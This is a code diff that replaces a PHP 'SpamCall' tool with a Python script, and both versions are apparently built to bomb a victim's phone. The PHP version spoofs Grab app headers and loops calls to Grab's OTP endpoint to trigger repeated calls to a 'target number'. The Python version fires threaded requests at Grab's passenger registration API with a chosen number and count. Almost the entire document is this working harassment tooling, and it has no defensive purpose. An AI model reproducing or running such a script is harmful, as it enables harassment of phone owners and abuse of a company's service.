@@ -1,142 +1,52 @@
-_________________________________________________
-|                   ! NOTICE !                  |
-|-----------------------------------------------|
-| Athor     = Henrycko                          |
-| Pendukung = Dzakira Alzena Daiva              |
-| GitHub    = https://github.com/thetermuxchoice|
-| Contact   = thetermuxchoice@gmail.com         |
-| Thanks To = https://www.grab.com/id/          |
-| Info      = Gunakan Tools Dengan Bijak :)     |
--------------------------------------------------
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# Coded by Henrycko
 
-<?php
-system('clear');
-function get(){
-	return trim(fgets(STDIN));
-}
-class prankcall{
-	public function __construct($no){
-		$this->number = $no;
-	}
-	private function get(){
-		return trim(fgets(STDIN));
-	}
-	private function correct($no){
-		$cek = substr($no,0,2);
-		if($cek=="08"){
-			$no = "62".substr($no,1);
-		}
-		return $no;
-	}
-	private function ekse(){
-		$no = $this->correct($this->number);
-		$rand = rand(0123456,9999999);
-		$rands = $this->randStr(12);
-		$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
-		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
-		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-		$h[] = "Content-Type: application/x-www-form-urlencoded";
-		$h[] = "Content-Length: ".strlen($post);
-		$h[] = "Host: api.grab.com";
-		$h[] = "Connection: close";
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-		curl_setopt($ch, CURLOPT_POST, 1);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		$x = curl_exec($ch); curl_close($ch);
-		$ekse = json_decode($x,true);
-		if(empty($ekse['challengeID'])){
-			echo "Gagal\n";
-		}else{
-			echo "Berhasil\n";
-		}
-	}
-	private function loop($many,$sleep=null){
-		$a=0;
-		$no = $this->correct($this->number);
-		while($a<$many){
-			$rand = rand(0123456,9999999);
-			$rands = $this->randStr(12);
-			$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production";
-			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
-			$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
-			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)";
-			$h[] = "Content-Type: application/x-www-form-urlencoded";
-			$h[] = "Content-Length: ".strlen($post);
-			$h[] = "Host: api.grab.com";
-			$h[] = "Connection: close";
-			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
-			curl_setopt($ch, CURLOPT_POST, 1);
-			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
-			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-			$x = curl_exec($ch); curl_close($ch);
-			$ekse = json_decode($x,true);
-			if(empty($ekse['challengeID'])){
-				continue;
-			}else{
-				$nn = $a+1;
-				echo "[$nn] Sukses\r";
-				$a++;
-			}
-			if($sleep!=null) sleep($sleep);
-			if($a>=$many) echo "\nCompleted!\n";
-		}
-	}
-	private function randStr($l){
-		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
-		$word = "";
-		for($a=0;$a<$l;$a++){
-			$word .= $data{rand(0,strlen($data)-1)};
-		}
-		return $word;
-	}
-	public function run(){
-		while(true){
-			echo "Mode Banyak (Y/n) : ";
-			$loop = $this->get();
-			if($loop=="y" OR $loop=="n"){
-				break;
-			}else{
-				echo "Yes/No?\n";
-				continue;
-			}
-		}
-		if($loop=="y"){
-			echo "Jumlah Spam : ";
-			$many = $this->get();
-			$this->loop($many);
-		}else{
-			$this->ekse();
-		}
-	}
-}
+from multiprocessing.pool import ThreadPool
+try:
+	import os, random
+	from time import sleep as turu
+	import subprocess as sp
+	import requests
+except ModuleNotFoundError:
+	print("\nSepertinya module requests BELUM Di Install")
+	print("$ pip install requests\n")
+	exit()
 
-echo " \n";
-echo " ____                         ____      _ _
-/ ___| _ __   __ _ _ __ ___  / ___|__ _| | |
-\___ \| '_ \ / _` | '_ ` _ \| |   / _` | | |
- ___) | |_) | (_| | | | | | | |__| (_| | | |
-|____/| .__/ \__,_|_| |_| |_|\____\__,_|_|_|
-      |_|                              v.2.3
-__________________________________________________
-|                   ! NOTICE !                   |
-|------------------------------------------------|
-| Athor     = Henrycko                           |
-| Pendukung = Dzakira Alzena Daiva               |
-| GitHub    = https://github.com/thetermuxchoice |
-| Contact   = thetermuxchoice@gmail.com          |
-| Thanks To = https://www.grab.com/id/           |
-| Info      = Gunakan Tools Dengan Bijak :)      |
---------------------------------------------------
-\n"
-echo " \n";
-sleep ('0.4');
-echo "Masukan Nomor Target : ";
-$no = get();
-$n = new prankCall($no);
-$n->run();
+try:
+	os.system('clear')
+	print("""\033[1;32m
+_______________________________________________
+|                 ! NOTICE !                  |
+|---------------------------------------------|
+| Penyusun  = Henrycko                        |
+| Pendukung = Dzakira Alzena Daiva            |
+| GitHub    = https://github.com/Henrycko     |
+| Thanks To = https://www.grab.com/id/        |
+| Info      = Gunakan Tools Dengan Bijak :)   |
+-----------------------------------------------
+""")
+	no = input("\033[1;37m[?] Nomor (62) =>\033[1;36m ")
+	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
+except KeyboardInterrupt:
+	print("\nKey interrupt")
+	exit()
+print()
+print("[*] RESULT:")
+def main(arg):
+	try:
+		idk=('phoneNumber')
+		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[+] Berhasil!")
+		else:
+			print("\033[1;31m[-] Gagal!")
+	except: pass
+
+jobs = []
+for x in range(jum):
+    jobs.append(x)
+p=ThreadPool(5)
+p.map(main,jobs)
+print("Selesai...!")
